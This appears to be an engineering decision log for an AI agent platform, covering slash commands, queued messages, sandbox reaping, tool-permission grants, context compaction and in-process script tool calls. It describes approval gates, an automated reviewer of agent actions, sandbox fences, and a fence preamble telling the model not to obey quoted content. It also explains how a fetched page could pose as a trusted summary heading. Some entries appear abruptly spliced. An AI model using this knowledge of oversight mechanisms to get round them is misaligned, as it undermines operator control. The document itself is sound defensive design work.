    - **A side confirmation for the reasoning estimate:** this model streams its thinking in `reasoning_content`, i.e. field mode — the half the templates strip and the half the estimate correctly does not count.
  - **Adjacent, and part of the same honesty pass: the footprint estimate counted no reasoning at all**, on the claim that thinking is never re-sent. It is — the library maps a `ThinkingPart` back out, and in **tag mode** (read from the response's own `content`) it becomes ordinary assistant *text* that no chat template can remove. The naive fix is also wrong, though: `should_compact` takes the **larger** of the provider's reported prompt size and the estimate, so counting the field-mode half too would override an accurate server-reported figure on exactly the Qwen/DeepSeek/GLM templates that strip it, and fold those threads early. So only tag-mode thinking is counted, the breakdown keeps the whole figure because it answers a different question, and both halves are measured against `cl100k` rather than asserted.

- **D96 — Typing a name to reach what the platform already has 🟢 DECIDED: one registry over five existing sources, and a reference that is never an injection.** Two composer affordances, `/` and `@`. Neither adds a capability: every one of them was reachable before, by describing it and hoping the model picked it, or by typing a path from memory. What they add is *addressability* — the operator naming the thing instead of hinting at it — and that framing is what decides almost every question below.
  - **One registry, five sources, and nothing new underneath it.** Thread actions (a literal tuple), published skills, the sub-agent roster, operator-authored workflows, and a project's own `.claude/commands/*.md`. Only the fourth is a table this feature owns; the rest are existing things given a typeable name. Rejected: a `commands` table duplicating skills, and client-side expansion — what a command *means* is the backend's to decide, and a client that sent the expansion would be sending a turn the operator never wrote.
  - **Precedence is locality, extended rather than re-invented** — installation-shipped → operator-authored → project-declared, which is `services/subagents/roster`'s rule one level up. **A collision drops nothing.** A skill, a workflow and a sub-agent all called `reviewer` are three real things, and deleting two because the third took the name is a data-loss bug wearing a precedence rule. Every spec carries a qualified name, the losers ship carrying `shadowed_by`, `/reviewer` resolves the winner and `/skill:reviewer` resolves exactly.
  - **An `action` command names a stable `actionId` the client maps onto a relay it already owns.** Rejected: a method+path+params executor — `/new` is navigation with no route behind it at all, which is what settles the shape. An id this build does not know renders **disabled** rather than throwing, so the backend can add one without waiting for a client.
  - **Skills and sub-agents are reached by directive, not by server-side invocation.** `skills_open` and `subagents_launch` already carry staging, the published-only check, permission folding and the approval gate. A second path would reproduce all of it and — decisively — produce a sub-agent with **no parent turn to receive its report**, since the report path runs through the tools layer. Recorded limitation: at Auto, `services/permissions/reviewer` reads position 0 of the user part and refuses to join the tail, so the reviewer rules on a launch whose brief it never reads. Acceptable because the spec's ceiling is enforced in the launcher regardless, but it is a real asymmetry and belongs here rather than being rediscovered.
  - **Skills became manually invocable, which flips a trust posture** worth stating: until now the catalog was name + description and only the model opened one. Defensible because *published* is already the operator's deliberate act — this adds a second way to reach what they had already cleared, not a second boundary.
  - **A project command's body is delimited and capped, never `wrap_untrusted`-fenced.** The fence's preamble tells the model not to follow what is inside it, and a template the operator deliberately invoked is precisely a set of instructions they want followed — fencing it would defeat the feature it was meant to protect. Both rejected alternatives are recorded because the next reader will otherwise "fix" this in the wrong direction: the fence (defeats it), and no delimiter at all (indistinguishable from the operator's own words in the injection row, which is the question that row exists to answer). What makes it safe is structural — the body lands in the **tail**, which the Auto reviewer already refuses to read as operator words.
  - **`@` is a reference, never an injection.** The turn carries **paths**; the model reads what it wants with `files_read_file`, which is classified a read and so costs nothing at any permission level. A pasted copy would go stale behind the file the moment it changed, and an `@` from twenty turns ago would replay old contents forever.
  - **The file listing resolves its root from the worktree's existence and branch, never from the in-memory holder map, and never creates a checkout.** `WorktreeManager._holders` is written only by `acquire`, so after a restart a worktree still on disk has no holder — a holder-based rule would silently list the operator's own checkout while the agent's first file call re-acquires the worktree, and they would be looking at different trees with nothing to report it. Typing a character must also never acquire the project's single checkout.
  - **The listing is agent-unreachable by construction.** Nothing under `tools/` or `agent/` may import it, guarded by a substring scan. The agent already walks this filesystem rooted at the workspace *its run* resolved; a second path with the project root in its hand would be a way around that rooting. The containment check is deliberately **not** covered by the guard — it lives with the rest of the containment in `services/sandbox/base`, is what the file tools already use, and "does this path stay inside this root" is the opposite of a way out of one.
  - **The inbound-token scope was settled by symmetry, not inherited.** `/commands` sits under `knowledge` beside `/skills`, **including its write half** — a token that can author a workflow can plant a template that later rides the operator's turns, which is the part worth deciding. Granted anyway because that scope already carries full authorship of skills, which are strictly more powerful: the model chooses and opens those on its own, where a workflow does nothing until the operator types its name.
  - **The operator's literal text is their turn; the expansion is announced tail context and is never persisted.** Three consequences: a command body never enters history, so editing a template changes what the *next* invocation does rather than leaving an old copy replayed forever; the request **head** is untouched, so a command that differs every turn cannot invalidate the cacheable prefix; and compaction folds a `/command` turn down to the opaque token, which is an accepted loss of fidelity in the summary.
  - **Commands and file refs are refused mid-stream rather than expanded into a queued message.** A queued message is injected verbatim with no prelude around it, so `/deploy prod` would reach the model as the literal token. Expanding before enqueueing is worse: the operator can edit a queued message, and they would then be editing text they never wrote.
  - **Two different answers to "survive a re-run", because the two things are different.** A **reference marker persists** with the prompt, exactly as an attachment marker does — a marker is a statement of fact (*these paths were referenced*), so replaying it is honest, and persisting is what makes a regenerate work with no second mechanism. A **command persists its invocation, not its expansion** — the name and the argument are facts about what the operator did, and the block is rebuilt from whatever that name resolves to *now*. Persisting the expansion was rejected twice over: a template would replay a copy of a file that has since been edited, and a directive reading "before anything else in this turn" is false by the next turn. Both ride `ModelRequest.metadata`, where the compaction reason already rides — no column, no migration.
    - The marker must persist but must **not render**: the bubble it lands in carries the operator's name and they did not write it. A sentinel string owned by the pair of functions either side of it settles that, rather than a parser trying to recognise prose.
    - An **edit** carries both forward as far as the edited text still names them — the composer's own rule that the text is the turn of record, applied later. The name survives; the **argument is re-read** from the new text, because the argument is the half an edit exists to change. The inline edit box is a plain textarea with no picker, so a client cannot re-send either and the alternative was silently dropping them.

- **D97 — The two surfaces that take the composer's slot 🟢 DECIDED: the run holds the queue, the run identifies the park, and an answer is a row in the transcript.** Five defects reported from use, around the queued-message bubbles and the `ParkDock` that asks for approvals and answers. They are one theme: a surface that takes the composer's place has to be as load-bearing as the composer, and three of these were places where it silently was not.
  - **A queued message being edited could be sent out from under the editor**, because the queue is the run's (`run.pending_messages`, drained at every model-request boundary) and "being edited" was a signal inside one bubble. The fix has to be the backend's for the same reason: a client-side "not yet" cannot be consulted by the thing doing the sending. `QueuedMessage.held` + `POST /runs/{id}/messages/{mid}/hold` + a `message.held` frame, taken before the first keystroke and released on every way out of the editor — including an unmount, since a hold nobody releases stalls the queue.
  - **A held message stops the drain rather than being stepped over**, which is the choice with a real cost: one forgotten editor stalls everything queued behind it. Skipping it was rejected because the alternative cost is worse and silent — the operator's third message reaching the model before their second, where the second is the one they were still writing. A hold is short, operator-caused and visible on the bubble; a reordered conversation is none of those.
  - **A steering message could destroy a pending question.** `message.injected` splits the assistant flow (it closes the streaming bubble and opens a fresh one), and the dock's park was derived from *the last streaming message* — so the blocks being answered ended up on a message that no longer qualified, the dock unmounted with the operator's half-written answers inside it, and the composer came back over a run that was still parked. Anything then typed queued into that same parked run, so the message took the question's place. The park is keyed to the **run** now: a parked call belongs to the turn whose run is attached, wherever the flow has since put it. The unsent answers moved to the controller for the same reason — a surface mounted by a `Show` may not own state the operator would mind losing.
  - **A park and a queued message are listed together**, in the dock, rather than the composer being restored beside it. Restoring the composer re-offers the one gesture the dock exists to withhold — a parked run cannot act on a message — while leaving the queue only in the transcript relies on the operator scrolling past a panel that has taken the slot those bubbles are normally managed from. Both reach the model on the same resume, so both belong in one place.
  - **An answered question is a row in the transcript, not a tool result.** It was reachable only as the `ask_user` call's prose result, inside a work log that folds shut — so a thread read as the agent asking nothing and then acting on something. Docking is now a *phase*, not a kind: the block stays, carrying the answers, and renders full-width like a View chip. Rendering it as the operator's own user bubble was rejected — it would credit them with a message they never typed, in a transcript where every other user bubble is one they did.
  - **The pairing is the backend's, warm and cold.** `question.answered` carries the questions beside the replies, built from the parked call's own arguments; a reload gets the identical list off `services/conversation_view.py`, which reads the prose back through `services/answers.parse_answer` — the inverse of the renderer that wrote it, pinned as a round trip. Asking the client to parse it instead would put the format in two codebases and break the day the wording improves. `answers.py` moved from `agent/` to `services/` to make that possible: the projection sits below `agent/` and importing upward is a genuine cycle.
  - **Simultaneous questions paginate, one question per page, flattened across calls.** Stacked, six questions were a wall of radio buttons over a transcript the dock had already taken the composer from, with nothing to say how much was left. Paging per *parked call* was rejected: the call is a fact about the model's turn, not a unit the operator perceives, and one call asking four questions is the case that hurts. Approvals stay one page, last, because they are already one batched decision. The submission is still **one body** — pagination is presentation over a batch, never a way to send half of it.
  - **A submitted plan opened an empty View panel**, and the cause was not the plan path at all: the viewport restored a hardcoded `leaf("view")` and never asked whether a surface had anything in it, while `hasContent` passed on *any* surface having something. The layout is now pruned **on read** against availability — never written back, the same discipline `clampWidth` keeps — and an empty panel opens onto the first available surface in registry order, which is the same derivation the header row's leftmost button uses.

- **D98 — A reap is about containers 🟢 DECIDED: the workspace stays on disk, and the model is told what is in it.** An operator watched the agent, mid-conversation, redo work it had already done. The files were still there; the model had no idea. Two independent causes, both of which had been true since the warm-container model was built, and the second of which the code had already half-noticed in its own docstrings.
  - **The seal was taking the work.** A reap sealed the workspace — tar, gzip, AEAD under the vault — and removed the plaintext, and what it sealed left out `.venv`, `node_modules`, `dist`, `build` and `.git`. The first two are defensible as bloat that is cheaper to rebuild than to store. The last three are not: `dist`/`build` is the build the agent just ran, and a working tree whose `.git` was dropped is *worse* than no tree at all, since the history it needs to reason about its own changes is the part that went. The restore said nothing either way, so the next turn met a workspace quietly missing exactly what the last one had spent minutes producing, and produced it again. **A reap now stops the containers and leaves the directory alone.** What a reap reclaims is memory, CPU and a network; a directory is none of those, and a conversation's files were never what the pressure was about.
    - **This widens D17's plaintext exception, and it is worth saying so plainly rather than leaning on precedent.** A worktree is already "a deliberate, narrow exception to at-rest encryption" because it is a checkout of the operator's own already-plaintext repository. A sandbox workspace is not that: it can hold a staged attachment or a skill body that *is* sealed in the database. So this is a genuinely wider exception, accepted on a single-operator machine, and the honest statement of the trade is that the vault no longer covers what the agent writes while it works.
    - **What goes with it is most of what the seal needed in order to be safe**, which is the real measure of the simplification: the fragment markers that told a half-written directory from a whole one, the sweep that adopted plaintext workspaces nobody owned, and *both* deferrals that made reaping wait for an unlocked vault. That last one was a live fault of its own — a locked vault is the state a machine sits in for hours, and containers accumulated unchecked through all of it. The idle sweep still collects one thing, a **delegated fork** an unclean shutdown stranded: a copy of a parent workspace that still exists under its own key, for a delegation that ended when the process died. That is the only directory a crash leaves that nobody will ever ask for again.
    - **The exclusion list survives, and stops being dangerous.** It still drives the fork's manifest, the merge back and the history snapshot — three-way merging a `.git` directory's internals is corruption rather than continuity, so the fork genuinely wants the pruning. What changed is that it no longer decides what is *kept*: `Settings.sandbox_walk_excludes` now decides only what is worth **reporting**, and everything it names stays on disk. A list whose worst outcome is a quieter block is a list nobody has to get right.
    - **Archives already written are read back once and deleted** (`services/sandbox/legacy_seal.py`). Dropping the format without a way out of it would have destroyed the files of every conversation that happened to be cold at upgrade time — the precise failure this whole entry is about. The module is dead the moment no installation carries a `sandbox/sealed/` entry.
  - **Nothing had ever told the model what was in `/work`.** `code_execute` returns two streams and an exit code; `files_write_file` returns a byte count; a directory listing existed only if the model thought to ask for one. So its only record that a file existed was the tool call still sitting in the replayed history — and compaction (D71) replaces that stretch with a summary, after which a conversation's own files are invisible to it. `tools/workspace_context.py` reads the directory and lists it, path and size, once per turn.
    - **At the tail, where the task list already is, and for the same reason.** A file listing changes on nearly every step, and a changing block at the *head* invalidates the inference engine's prompt-prefix cache from byte 0 for the whole conversation behind it. `PromptContextProvider` grew a `PromptContextRequest` to make this possible at all: the mode and the workspace key are what decide *which* files to describe, and neither was reachable from the old three-argument shape. A struct rather than a fourth argument, because these providers are contributed by manifests and by both sub-agent paths.
    - **It creates nothing** — not a session, not a directory (`SandboxSessionManager.settled_workspace`). Resolving the workspace properly would mint both on every turn, including the great majority that never touch a file, which is the cost the lazy-container design exists to avoid. A worktree thread gets no block at all: it has git and `repo_instructions`, and it was never the one that did not know what was on disk.
    - **Derived from disk, never remembered**, which is the property that makes it work where a summary does not. It is correct after a fold, after a reap, after a restart, and after a turn the model itself no longer has.
    - **The pruned directories are named without being listed**, which the first end-to-end run is what turned up: the block described `src/analysis.py` and said nothing at all about the `.venv` and the `dist/` sitting beside it, because the walk prunes both. That is the seal's own mistake wearing new clothes — the agent is not told it already has the expensive thing, so it makes it again. One line (`Also present, not listed: .venv/, dist/.`) buys back what the pruning costs, for the six names where the answer changes what the agent does: `.venv`, `venv`, `node_modules`, `.git`, `dist`, `build`. Caches are deliberately not among them, and neither are `.home`/`.tmp`, which back `HOME` and `TMPDIR` inside the box and are our plumbing rather than the agent's work.
  - **"The sandbox went overboard" was the question this started from, and the answer is mostly no.** Nothing in `services/sandbox/` was dead: every module was on a live path with no flag in front of it, and the egress sidecar, the proxy and the two fences are each the closing of an adversarial finding that was reproduced end to end before it was written down (D78, D79, D80). Deleting any of it reopens a documented hole. The seal was the one genuinely disproportionate part, and it was also the one causing the bug. Two further candidates were examined and **rejected on inspection**: folding `detect.py` into the package's `__init__` would put the fail-closed factory's safety invariant inside a re-export surface, and moving `run_subprocess` into `process.py` would put a container-runtime helper inside a module whose whole stated job is the operator's real machine. Only `fence.fence_available` went — a pure alias for `host.resolve_confinement`, re-exported instead.

- **D99 — A standing yes the operator can actually give to a whole tool 🟢 DECIDED: a second width, offered in its own words, decisive at Auto and stopped only by the unrecoverable.** D82 was right and incomplete. It left "don't ask again" meaning two narrower things than the words suggest — on a command-running tool the grant names the command, and at Auto (the default since D83) no grant settles anything, it only fills a `neutral` authorization. The result, reported from use: a thread doing a morning's work in a shell hits a fresh prompt per command, and an operator who has decided to stop reading them has no way to say so. Re-widening the existing tick was rejected — that is exactly the hole D82 closed, and it would be re-opened by the surface that describes itself as the smallest one. So the card offers a **second control** instead: a checked opt-in on a call that runs a command reveals a two-way pick between *just this command* (the default, unchanged) and *anything this tool runs*.
  - **A tool that runs no command has only the wider width, and the tick means it.** There is nothing narrower for such a call to be scoped to — the tool *is* the act, and the checkbox has always said "don't ask again for this tool" — so no picker appears and the tick records the decisive width. At Auto they part: a command-scoped grant rides into the review as authorization for the act it names and fills a `neutral` reading only, while a whole-tool grant *is* the answer — `_authorization` returns `explicitly_yes` for it outright, so `low` and `high` both clear.   - **Two things it still cannot buy, and the second is the load-bearing one.** An act nobody can undo parks at both widths — D81's rule is about recoverability, not authorization, and `_verdict_decision` never consulted the authorization for `too_destructive` anyway. And **a review that could not run parks at both widths**: no utility model bound, a reviewer timeout, a spent budget. Nothing looked at the act, so nothing can say it is not the unrecoverable kind the width was never allowed to clear. Stated plainly because it has a cost: on an installation with no utility model bound the wider pick buys nothing at Auto, while still buying everything at Manual and Edit.

An empty `command_prefix` already means "the whole tool", so the free version was to treat emptiness as the wider width — but emptiness is a shape several writers produce, and one of them is a scheduled task's `pre_authorized` seed (D24). Inferring from it would hand every recurring task a review-free shell for the length of its run. Deriving instead from the *kind of run* asking was rejected for one fact: a task's thread is an ordinary conversation the operator can reopen, so the seed would be promoted the moment a human typed into it. Stored, a row says what it authorizes without anyone having to know who is reading it, and every row already written keeps the meaning it was written with.
  - **One reading, three call sites.** `grant_width(tool, args, grants)` answers `none`/`command`/`tool`, and `covered_by_grant` is reduced to `!= "none"` over it — the park-time split, the review, and the approve route's resume-time re-validation cannot drift about what a grant reaches. A call cleared by a decisive grant is still marked `GrantApproved`, because the wider width is revocable while the rest of a batch is still parked.
  - **The chip says which width it is** (`shell_run_command · any command`), since the empty prefix it shares with an ordinary non-command grant is exactly the thing a reader cannot see — and it is the chip they are most likely to want to revoke.

- **D100 — The mission-control register 🟢 DECIDED: the console's three devices, plus one licensed expressive moment per screen.** The operator's complaint was that the interface was "close" to NASA but had no sense of wonder or personality. It is close because the bones already are NASA — Instrument is Helvetica on a strict 4px grid with registration marks and asset ids, which is the 1975 Graphics Standards Manual skeleton. What it *read* as was a terminal, because the phosphor green, the braille throbbers and the block caret are a DEC/CRT lineage, not a spacecraft one. Four registers were mocked up against the real dashboard and reviewed side by side before anything was written.
  - **The gap was devices, not restraint.** Three things make a console legible as a console and none of them existed: a **mission clock**, a **caution & warning grid** in place of a flat capability band, and an **event sequencer** in place of an undifferentiated in-flight list. All three are machine output, so §2 and §11 already licensed them — the system was not forbidding them, nobody had built them. The C&W grid is the one that is *also* a straight usability win: a band of equally-bright cells must be read left to right, where a matrix with one lit cell has already answered the question.
  - **The Ink signature stays phosphor green, and that is the finding that surprised.** Green-on-black reads as "terminal" to a modern eye, but the Apollo MOCR displays were literally green phosphor — the hue was never the un-NASA part. Only Paper moved, `#0077B6` → `#0B3D91`, from a cerulean that reads as a web link to the darker blue of a printed plate. **`accent-alert` did not move with it**: the matching brighter red measures 3.6:1 on white and fails §12, and a semantic token is not worth re-pointing for a hue that cannot be read.
  - **The ambient-starfield register is the rejected angle, and it is rejected on the system's own terms.** It was the most immediately striking of the four and it puts atmosphere permanently behind working content, which is the exact failure §11 was written about after Terminal-HUD. What replaced it is **§11.1, the licensed moment**: one expressive device per screen, admitted only into a region with nothing to compete with — an empty state, the auth screens, the launchpad hero, a lightbox. Bounding it by *region* rather than by taste is what makes it a rule instead of a licence, and the empty state is where it pays off most, because a region with nothing in it has nothing to drown out.
  - **Why an exception was needed at all.** §1.1 and §1.4 followed absolutely produce a system whose loudest available register is "quiet", and §1.6 already names that as the other failure mode — restraint is the goal, anonymity is not. The moment is the register the system was missing, not a relaxation of the four rules around it.
  - **A fifth justified border (§7) and a third uppercase-mono step (§4).** The console group — a frame with a header band over flush ruled rows — earns its border the way a tiled pane does: the rows are flush by construction so space cannot separate them, and they must read as set *into* the panel so surface value cannot either. `plate` earns its step by naming a region where `meta` reports a state; if it ever starts appearing where a value belongs, it should be deleted rather than defended.
  - **The clock is a formatter and must stay one.** `created_at` and `started_at` were already on the wire from `/conversations` and `/runs` and were being dropped by the frontend mappers, so the clocks cost a seam widening and no backend change. What genuinely does not exist is a monotonic run ordinal — `last_seq` is a per-run SSE counter, not a mission number — so the sequencer designates events by run id rather than by a `SEQ` column. The array index was available and is not used: a frontend-derived value standing in for backend state is the one thing the frontend is never allowed to do.
  - **A latent timestamp bug surfaced on the way, and is fixed in the frontend rather than at the route.** The backend stamps UTC everywhere, but SQLite has no datetime type, so a tz-aware value round-trips as naive; `core/serde.as_utc` re-stamps it and any route reading a column without going through it ships `2026-09-19T13:57:41.480578`. `Date.parse` reads exactly that form as **local time** — so on the operator's UTC−4 host every such stamp landed four hours in the future, which pinned the new clock at zero and had been quietly making `relativeTime` read "NOW" for four hours. The fix is one `parseInstant` in `lib/format` that every formatter now routes through, rather than a patch to the one route that was caught: the naive form is what a column read produces *by default*, so the next route to skip `as_utc` reintroduces it silently. Fixing it at the source as well is worth doing and is not done here — it would be a wire change across every consumer, and the frontend has to be defensive regardless.

- **D101 — What a fold shows the operator 🟢 DECIDED: parse the checkpoint once on the backend, and draw the fold point on the gauge rather than retuning anyone's dials.** The mechanism was right and its account of itself was not. `summarize.py` builds one `labelled` string — `COMPACT_PREAMBLE` plus the sectioned summary, its tool facts nonce-fenced — and that *same* string is stored, put on `conversation.compacted`, and rendered by the divider through `whitespace-pre-wrap`. The eight headings were a parsed contract (D64) that the one surface built for a human never parsed.

What decides it is that the roster is a **security boundary**, not a formatting convenience: only a heading naming one of *our* sections may end a section, because the summarizer is asked to quote its sources and a fetched page's own `## Notes for the assistant` arrives looking exactly like a heading. The event derives `sections` as a `@computed_field` off its own `summary` rather than carrying a second field: a parse of a value already on the frame is one more thing to keep in step, and the two disagreeing is a bug nobody sees until a checkpoint reads wrong.
  - **Untrusted is decided by section identity, never by finding a fence.** A checkpoint written before `fence_tool_facts` existed still repeats what a web page said, so keying the attribution off the markers would silently un-attribute every old one. The markers are stripped and the quote inside them kept — the operator gets the bordered, labelled block the fence is the model's version of — and a checkpoint that parses into nothing degrades to a single keyless section rather than to an empty panel.
  - **The gauge's bands and the fold were never related, and the defaults had quietly made that a problem.** `DEFAULT_CONTEXT_THRESHOLDS` still explained itself by saying both sat below "auto-compaction's own 0.95 default", so the ring would redden while a fold could still help. Changing them to make the arrangement tidy would decide for the operator a thing D62 deliberately left to them. - **D102 — A level that asks nothing 🟢 DECIDED: a fifth preset, a fourth policy, one branch, and the fence untouched.** The operator wanted free rein: a thread where every approval is granted and nothing pauses. Keeping the clearance in the decision rather than suppressing the marking is what makes the exception readable: there is exactly one branch in the codebase where a self-raised gate is dropped, and it names itself.

Restoring it would mean a plan approval silently re-granting the thing the operator has to name explicitly everywhere else.

- **D103 — Claim-level attribution in a research thread 🟢 DECIDED: an extraction pass over the finished answer, not a structure the writer maintains.** A research answer cites at the message level — `Citation` is `{url, title}` and the fold dedups it by URL — so the operator can see *that* a page was read and never *which sentence in it* carried the claim. The reported failure is specific and it is not "no citation": it is a citation that, when opened, did not say what was claimed. Closing that means a claim→source→passage link, and there are four ways to get one.
  - **Two of them ask the writer, and the writer is the thing under audit.** Structured evidence refs emitted alongside the prose are exact, and they are exact *about what the model says it used*; inline verbatim quotes are checkable against the retained page, but only for the quotes the model chose to offer. Both are rejected on the same ground: the operator's question is whether the synthesis is honest, and an answer assembled from the synthesizer's own account of itself cannot settle it. Structured refs carry a second cost — the model maintains prose and a parallel table and keeps them in step, and the drift shows up as an orphan marker in an answer nobody re-reads.
  - **Retrieval at click time is the rejected near-miss, and it is rejected on strength rather than cost.** It is the cheapest option on the board: `FetchedPage.content` already holds the full extracted markdown durably, an `embedding` role is already bound, nothing about generation changes, and it works on threads already in the database. What it returns is the best-matching passage in the cited source — which is a claim *about the source*, not about the answer. That is genuinely weaker where it matters most: a paraphrase three inferential steps from anything the page says will still surface a plausible neighbour, and a plausible neighbour is precisely the failure being hunted.
  - **So the pass runs after the answer, over the answer.** The finished prose and the run's retained tool results go to the `utility` role, which returns claim→source→passage triples. It reads what was actually written against what was actually fetched, and it is a second reader rather than the first one's self-report. It costs one model round trip per research answer, which is the price and is stated plainly: it is a background-role call on a mode whose `request_limit` is already 60, so it is a rounding error against the reading it audits.
  - **A claim the pass cannot ground is the output, not an error.** The panel says a claim has no supporting passage in its own cited source, and that row is the most valuable one on the surface — it is the exact defect the operator described, found without their having to re-read anything. An extraction that returns nothing for an entire answer degrades to today's message-level sources rather than to an empty panel.
  - **Not in the frontend, for the reason nothing is.** The prompt already asks for inline markdown links, so a client-side parser over the rendered answer was available and costs no model call. It is not a cheaper version of this decision, it is a different architecture: the frontend would be deciding what supports what. Extraction is a domain rule and it lives where domain rules live.
  - **It is retroactive, which decided the ordering.** Tool results are persisted structurally — `core/serde` keeps them precisely so cold citation derivation works — so the pass can run over a thread finished last month. The Sources panel therefore does not need this landed to ship; it ships on the message-level inventory and gains the claim arm when the pass exists.

- **D109 — Programmatic tool calling 🟢 DECIDED: `run_code`, always on, over the tools the thread's level clears unasked.** Parallel calls were already built (`parallel_tool_calls` on the agent, a batch run as concurrent tasks, a gated call set aside while the rest run). What was missing was a way for the model to write a script that calls tools and hand back only what the script returns — a dozen reads filtered down to three, a search per item joined into a table — so the intermediate results cost neither a round trip each nor a place in the context. `pydantic_ai_harness`'s `CodeMode` does exactly that over a Monty sandbox that runs **in this process**, and every call a script makes goes through the agent's own `ToolManager.handle_call`: the enabled gate, the approval gate, the describing stage, the narration strip and every capability hook still apply. `agent/code_mode.py` configures it and adds what a chassis needs around it.
  - **Clear-only: a script may call only what the level would let run unasked.** A tool is folded while it is still an ordinary `function` after `tools/toolsets.py`'s approval gate has marked everything the live level does not clear; `CodeMode` re-reads the catalog every step, so a level that moves mid-conversation moves the catalog at the next step. A gated tool stays a direct call and parks exactly as before, so a script never holds a call nobody can answer. Asking the operator a question and entering or submitting a plan never fold, since each ends or reshapes the turn; a tool whose argument is itself a program (`code_arg_name` — `code_execute`, `code_run_host_command`, the shell) stays direct by the library's own rule rather than nesting one code surface inside another.
  - **What still gates inside a script is the tool that gates itself** — a global recall, an untrusted external tool, a skill edit — which the catalog cannot see coming. It is ruled on inline by a `HandleDeferredToolCalls` hook reusing `settle_deferred` (the level, the operator's grants, Auto's review, with the turn's own `TurnStart` and review budget, which now ride on `RunDeps`), and a call that would need the operator is refused with words telling the model to call the tool directly, where it can park. A script's call is recognised by its context: the sandbox dispatches through a `ToolManager` whose context *is* the `run_code` call's, so the handler sees `ctx.tool_name == "run_code"` and a tool hook sees it on `ctx.tool_manager.ctx`; a top-level batch names no tool and is declined, unchanged. A second, nested-only hook sends a call the level no longer covers back through that same ruling, for the script whose catalog was read before a plan entered beside it narrowed the thread — so it is withheld at Plan, reviewed at Auto, and refused with the way round only where the operator would have had to answer.
  - **A folded tool stays a direct call as well — a departure from the library, whose split is exclusive.** Exclusive folding would have turned every file read and every search into a script. `run_code` is for a fan-out; a single lookup is still a single call. The price is that the folded tools appear twice, so `run_code`'s description renders each as a **bare signature** with its prose left on the direct definition it would repeat: the library's own rendering, a full docstring per function, cost 23.6k characters at Auto; bare signatures cost 9.3k, taking a fresh request from 36.6k to 46.0k (`tests/test_tool_schema_cost.py`, both ceilings raised deliberately). Its bytes move when the level does, and so does the order of the array: the library returns the folded and the direct tools as two sets, so the folded ones lead and a level change that moves a tool across that line moves it in the array, invalidating the cached tool definitions from the first tool that moved rather than only at the tail. Within a level the array is identical turn to turn (`tests/test_prompt_prefix_stability.py`), and a level change is an operator's act, rare enough to pay for once.
  - **The work log shows a script's calls as calls.** The library streams nothing for them, so the capability announces each one and `agent/translate.py` turns them into the ordinary `tool.*` frames with an additive `parent_tool_call_id`; a reload rebuilds the same rows from the record `CodeMode` writes on the script's own result. A call that raised has no return in that record, so a reloaded row says only that it did not complete — the live stream carried the reason.
  - **Read-only scripts only was rejected.** It is the safest cut and it gives up the workspace writes the level already clears on their own — a script that reads, edits and verifies a batch of files would have to come back out to write each one, for no protection the direct call would have given.
  - **Judging every tool inline was rejected.** Folding the gated tools too, and ruling on each call the script makes, reads as the complete version — but a script cannot park. Every call that needed the operator would become a refusal mid-script, and the operator would have lost the prompt they get today for a call made directly.
  - **A per-model flag was rejected; the operator chose always on.** Which models write good Monty is a guess this codebase would have to keep current, and a model that never reaches for `run_code` pays only its schema.
  - **Our own RPC bridge into the docker Python sandbox was rejected.** It would put scripts in a real CPython with the full standard library, and it is a second channel from untrusted code back into the host's tool stack that this codebase would have to secure itself, with a container round trip on every nested call. Monty is in-process, cheap, and has no host access to take away.
  - **Running model-written scripts unsandboxed on the host was rejected outright.** A script with the interpreter's own reach would bypass both the approval gate and the OS fence — the two things that make Auto defensible — the first time it imported `subprocess`.

- **D110 — No retained tail 🟢 DECIDED: a fold summarizes everything since the newest checkpoint, and the summary alone carries the thread; the summary prompt is written for completeness and for any kind of session.** Reverses D62's `keep_turns = 3`, and removes the setting outright rather than defaulting it to 0. Two things forced it. The tail was a **prerequisite** in disguise: `compaction_plan` refused whenever the thread had `keep_turns` turns or fewer, so a single prompt the agent answered by filling the window — the thread that most needs a fold — got "nothing to fold" from the button, the threshold and the overflow's **Compact and retry** alike. And the operator's judgement is that verbatim turns under a summary **degrade** what follows rather than protect it: two accounts of the same recent work, one of them partial. So the burden moved to the summary. The prompt now says it *replaces* the conversation. It asks for completeness over brevity and adds `Operator requests` (their asks in their own words, and where each stands), `Done so far`, `Latest exchange` (the operator's last message quoted in full, and whether the reply finished) and `Other context` (the catch-all). Every section is optional and free-form, because a session can be casual talk, research, writing or a long build, and a checklist shaped like one of those loses the others. Only the heading *names* stay fixed, since the parser fences and carries forward by them. "Nothing to fold" now means only that nothing follows the newest checkpoint. A branch point still holds back the request being re-answered.
  - **Keeping the tail but shrinking it on a short thread was rejected** — it was this decision's first form. It removed the prerequisite, but it kept replaying turns the summary already covers.
  - **Cutting inside a turn was rejected.** A turn start is still the only boundary that can't strand a tool call from its result, so a turn still running when it overflows can't be folded until it is recorded.
  - **The summary's output budget was not raised here** — superseded by D111, which removed it and the timeout outright.

- **D111 — The summary has no time limit and no length limit 🟢 DECIDED: no `max_tokens`, no deadline, the watchdog held open, and the merge done in rounds.** D110 made the summary the thread's only memory, and a memory cut short at 4096 tokens or 100 seconds is a memory with its end missing, which is the part the next turn continues from. So `auto_compact_max_tokens` and `auto_compact_timeout_s` are deleted rather than raised, and the fold's shared deadline with them. Three things had to change so that "no limit" was actually true and not just the absence of a setting:
  - **The inactivity watchdog would have become the limit.** A run is killed after 120s without an event. A local model prefilling a long transcript, or a reasoning model thinking before its first text delta, is silent for exactly that long. `fold()` now runs inside `Run.keepalive()`, the substrate's existing scope for a long call that emits nothing, so only the run's wall clock (off by default) still bounds it.
  - **Omitting `max_tokens` is not "unlimited" on every provider.** On an OpenAI-compatible server it is the server's own "until done". Pydantic AI's `AnthropicModel`, though, substitutes 4096. The Anthropic adapter now reads each model's advertised `max_tokens` from the Models API and sets it on the model at construction, so an Anthropic request without its own value gets the model's real ceiling.
  - **Uncapped partials can outgrow the merge.** A chunked fold's partial summaries used to be bounded by the output cap, so they always fit one merge call. Now `_reduce` groups consecutive partials that fit `auto_compact_input_max_tokens` and merges in rounds until one is left. If even a single partial is over budget, it merges everything in one call and lets the model refuse, rather than looping. *Superseded by D112: there are no partials — a fold is one call by the thread's own model.*
  - **Rejected: raising the numbers.** Any figure is a limit someone will eventually hit on the one thread where it matters, and a summary is not a place to hit one silently.
  - **What still bounds a fold** is the provider itself — its context window and its HTTP read timeout on a dead connection. Neither is a policy of ours.

